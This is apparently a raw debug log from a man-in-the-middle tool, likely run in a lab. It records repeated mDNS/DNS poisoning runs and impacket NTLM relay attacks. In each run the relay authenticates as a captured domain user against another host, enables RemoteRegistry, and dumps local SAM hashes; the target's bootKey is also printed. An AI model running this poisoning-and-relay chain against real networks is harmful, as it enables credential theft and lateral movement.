2021-10-31 09:14:21.505 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:277 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
2021-10-31 11:13:56.422 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for GBG
2021-10-31 11:13:56.432 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Data
2021-10-31 11:13:56.442 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-10-31 11:13:56.443 | DEBUG    | impacket.examples.secretsdump:saveSAM:800 - Saving remote SAM database
2021-10-31 11:13:56.449 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:13:56.449 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:13:56.450 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:13:56.450 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:13:56.485 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-10-31 11:13:56.486 | DEBUG    | impacket.examples.secretsdump:getHBootKey:1161 - Calculating HashedBootKey from SAM
2021-10-31 11:13:56.589 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:13:56.629 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:13:56.672 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:13:56.721 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:13:56.777 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:13:56.778 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:113 - Done dumping SAM hashes for host: 192.168.253.129
2021-10-31 11:13:56.778 | ERROR    | impacket.examples.ntlmrelayx.attacks.smbattack:run:115 - another thread holds terminal_lock
2021-10-31 11:13:56.782 | INFO     | impacket.examples.secretsdump:__restore:688 - Stopping service RemoteRegistry
2021-10-31 11:13:56.785 | INFO     | impacket.examples.secretsdump:__restore:691 - Restoring the disabled state for service RemoteRegistry
2021-10-31 11:14:43.417 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:282 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-10-31 11:14:43.418 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
2021-10-31 11:14:43.427 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:196 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-10-31 11:14:43.430 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-10-31 11:14:43.432 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:78 - Starting smb-relay server...
2021-10-31 11:14:43.443 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-10-31 11:14:48.632 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:48.632 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:48.632 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-10-31 11:14:48.661 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:48.661 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:48.662 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-10-31 11:14:48.693 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:48.694 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:48.696 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:48.696 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:49.618 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:49.619 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:49.622 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:49.623 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:49.651 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-10-31 11:14:49.691 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-10-31 11:14:49.704 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-10-31 11:14:49.704 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-10-31 11:14:49.732 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:659 - Service RemoteRegistry is in stopped state
2021-10-31 11:14:49.742 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:673 - Service RemoteRegistry is disabled, enabling it
2021-10-31 11:14:49.746 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:676 - Starting service RemoteRegistry
2021-10-31 11:14:49.779 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:49.780 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:49.782 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:49.783 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:49.786 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:49.786 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:49.789 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:14:49.789 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:14:50.779 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for JD
2021-10-31 11:14:50.793 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Skew1
2021-10-31 11:14:50.803 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for GBG
2021-10-31 11:14:50.813 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Data
2021-10-31 11:14:50.823 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-10-31 11:14:50.823 | DEBUG    | impacket.examples.secretsdump:saveSAM:800 - Saving remote SAM database
2021-10-31 11:14:50.859 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-10-31 11:14:50.859 | DEBUG    | impacket.examples.secretsdump:getHBootKey:1161 - Calculating HashedBootKey from SAM
2021-10-31 11:14:50.960 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:14:51.001 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:14:51.048 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:14:51.100 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:14:51.154 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:14:51.155 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:113 - Done dumping SAM hashes for host: 192.168.253.129
2021-10-31 11:14:51.156 | ERROR    | impacket.examples.ntlmrelayx.attacks.smbattack:run:115 - another thread holds terminal_lock
2021-10-31 11:14:51.160 | INFO     | impacket.examples.secretsdump:__restore:688 - Stopping service RemoteRegistry
2021-10-31 11:14:51.164 | INFO     | impacket.examples.secretsdump:__restore:691 - Restoring the disabled state for service RemoteRegistry
2021-10-31 11:15:24.702 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:282 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-10-31 11:15:24.703 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
2021-10-31 11:15:24.707 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:196 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-10-31 11:15:24.709 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-10-31 11:15:24.710 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:78 - Starting smb-relay server...
2021-10-31 11:15:24.721 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-10-31 11:15:30.031 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:30.032 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:30.032 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-10-31 11:15:30.079 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:30.079 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:30.080 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-10-31 11:15:30.123 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:30.123 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:30.126 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:30.127 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:31.014 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:31.015 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:31.021 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:31.022 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:31.065 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-10-31 11:15:31.109 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-10-31 11:15:31.111 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-10-31 11:15:31.112 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-5: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-10-31 11:15:31.129 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:31.129 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:31.130 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:31.130 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:31.135 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:31.135 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:31.136 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:31.136 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:31.146 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:659 - Service RemoteRegistry is in stopped state
2021-10-31 11:15:31.156 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:673 - Service RemoteRegistry is disabled, enabling it
2021-10-31 11:15:31.162 | INFO     | impacket.examples.secretsdump:__checkServiceStatus:676 - Starting service RemoteRegistry
2021-10-31 11:15:32.119 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:32.120 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:32.123 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:15:32.124 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:15:32.193 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for JD
2021-10-31 11:15:32.216 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Skew1
2021-10-31 11:15:32.236 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for GBG
2021-10-31 11:15:32.250 | DEBUG    | impacket.examples.secretsdump:getBootKey:746 - Retrieving class info for Data
2021-10-31 11:15:32.261 | INFO     | impacket.examples.secretsdump:getBootKey:760 - Target system bootKey: 0xa914c891db39b6910864254739800e33
2021-10-31 11:15:32.261 | DEBUG    | impacket.examples.secretsdump:saveSAM:800 - Saving remote SAM database
2021-10-31 11:15:32.297 | INFO     | impacket.examples.secretsdump:dump:1216 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
2021-10-31 11:15:32.298 | DEBUG    | impacket.examples.secretsdump:getHBootKey:1161 - Calculating HashedBootKey from SAM
2021-10-31 11:15:32.401 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:15:32.444 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:15:32.492 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:15:32.545 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:15:32.602 | DEBUG    | impacket.examples.secretsdump:dump:1256 - NewStyle hashes is: True
2021-10-31 11:15:32.602 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:113 - Done dumping SAM hashes for host: 192.168.253.129
2021-10-31 11:15:32.603 | ERROR    | impacket.examples.ntlmrelayx.attacks.smbattack:run:115 - another thread holds terminal_lock
2021-10-31 11:15:32.607 | INFO     | impacket.examples.secretsdump:__restore:688 - Stopping service RemoteRegistry
2021-10-31 11:15:32.611 | INFO     | impacket.examples.secretsdump:__restore:691 - Restoring the disabled state for service RemoteRegistry
2021-10-31 11:16:17.465 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:282 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-10-31 11:16:17.466 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
2021-10-31 11:16:17.477 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:196 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-10-31 11:16:17.484 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-10-31 11:16:17.487 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:78 - Starting smb-relay server...
2021-10-31 11:16:17.508 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-10-31 11:16:29.658 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:16:29.658 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:16:29.658 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-10-31 11:16:29.702 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-10-31 11:16:29.703 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-10-31 11:16:29.703 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-10-31 11:16:29.752 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
